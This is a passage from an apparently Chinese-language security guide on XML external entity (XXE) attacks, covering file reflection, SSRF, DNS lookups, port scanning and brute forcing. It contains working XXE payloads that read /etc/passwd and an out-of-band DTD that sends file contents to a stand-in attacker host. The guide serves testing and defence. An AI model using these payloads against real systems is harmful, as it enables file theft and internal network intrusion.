</SOAP:ENVELOPE>
```

#### 反射文件检索

考虑以下 XXE 示例代码：

```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE root [
 <!ELEMENT includeme ANY>
 <!ENTITY xxe SYSTEM "/etc/passwd">
]>
<root>&xxe;</root>
```

**前面的 XML 定义了一个名为 `xxe` 的实体，实际上是 `/etc/passwd` 的内容，将在 `includeme` 标签中展开。如果解析器允许引用外部实体，它可能在 XML 响应或错误输出中包含该文件的内容。**

#### 服务器端请求伪造（SSRF）

**服务器端请求伪造（SSRF）发生在服务器接收到恶意 XML 模式时，使服务器通过 HTTP/HTTPS/FTP 等检索远程资源。**SSRF 已被用于检索远程文件、在无法反射文件时证明 XXE，或对内部网络执行端口扫描或暴力攻击。

##### 外部 DNS 解析

**有时可以诱导应用程序对任意域名执行服务器端 DNS 查找。**这是 SSRF 最简单的形式之一，但需要攻击者分析 DNS 流量。Burp 有一个检查此类攻击的插件。

```xml
<!DOCTYPE m PUBLIC "-//B/A/EN" "http://checkforthisspecificdomain.example.com">
```

##### 外部连接

当存在 XXE 且无法检索文件时，可以测试是否能建立远程连接：

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
 <!ENTITY % xxe SYSTEM "http://attacker/evil.dtd">
 %xxe;
]>
```

##### 使用参数实体的文件检索

参数实体允许使用 URL 引用检索内容。考虑以下恶意 XML 文档：

```xml
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE root [
 <!ENTITY % file SYSTEM "file:///etc/passwd">
 <!ENTITY % dtd SYSTEM "http://attacker/evil.dtd">
 %dtd;
]>
<root>&send;</root>
```

这里的 [DTD](https://www.w3schools.com/xml/xml_dtd_intro.asp) 定义了两个外部参数实体：`file` 加载本地文件，`dtd` 加载远程 [DTD](https://www.w3schools.com/xml/xml_dtd_intro.asp)。远程 [DTD](https://www.w3schools.com/xml/xml_dtd_intro.asp) 应包含类似以下内容：

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!ENTITY % all "<!ENTITY send SYSTEM 'http://example.com/?%file;'>">
%all;
```

第二个 [DTD](https://www.w3schools.com/xml/xml_dtd_intro.asp) 导致系统将 `file` 的内容作为 URL 参数发送回攻击者的服务器。

##### 端口扫描

端口扫描生成的信息量和类型取决于实现方式。响应可分类如下，从简单到复杂：

**1) 完全泄露**：这是最简单且最不寻常的场景，通过完全泄露，你可以清楚地看到查询服务器返回的完整响应，获得连接到远程主机时发生的精确表示。

**2) 基于错误**：如果无法看到远程服务器的响应，可能可以使用错误响应生成的信息。考虑一个 Web 服务在尝试建立连接时在 SOAP Fault 元素中泄露详细信息：

```text
java.io.IOException: Server returned HTTP response code: 401 for URL: http://192.168.1.1:80
 at sun.net.www.protocol.http.HttpURLConnection.getInputStream(HttpURLConnection.java:1459)
 at com.sun.org.apache.xerces.internal.impl.XMLEntityManager.setupCurrentEntity(XMLEntityManager.java:674)
```

**3) 基于超时**：扫描器可能在连接开放或关闭的端口时生成超时，具体取决于模式和底层实现。如果在尝试连接关闭端口时发生超时（可能需要一分钟），那么连接到有效端口的响应时间将非常快（例如一秒）。开放和关闭端口之间的差异变得相当明显。

**4) 基于时间**：有时很难区分关闭和开放端口，因为结果非常微妙。要确定端口状态，唯一的方法是对到达每个主机所需的时间进行多次测量，然后分析每个端口的平均时间以确定每个端口的状态。如果在高延迟网络中执行，这种类型的攻击将很难完成。

##### 暴力破解

**一旦攻击者确认可以执行端口扫描，执行暴力攻击就是将 `username` 和 `password` 嵌入 URI 方案（http、ftp 等）的问题。**例如，请看以下示例：

```xml
<!DOCTYPE root [
 <!ENTITY user SYSTEM "http://username:password@example.com:8080">
]>
<root>&user;</root>
```
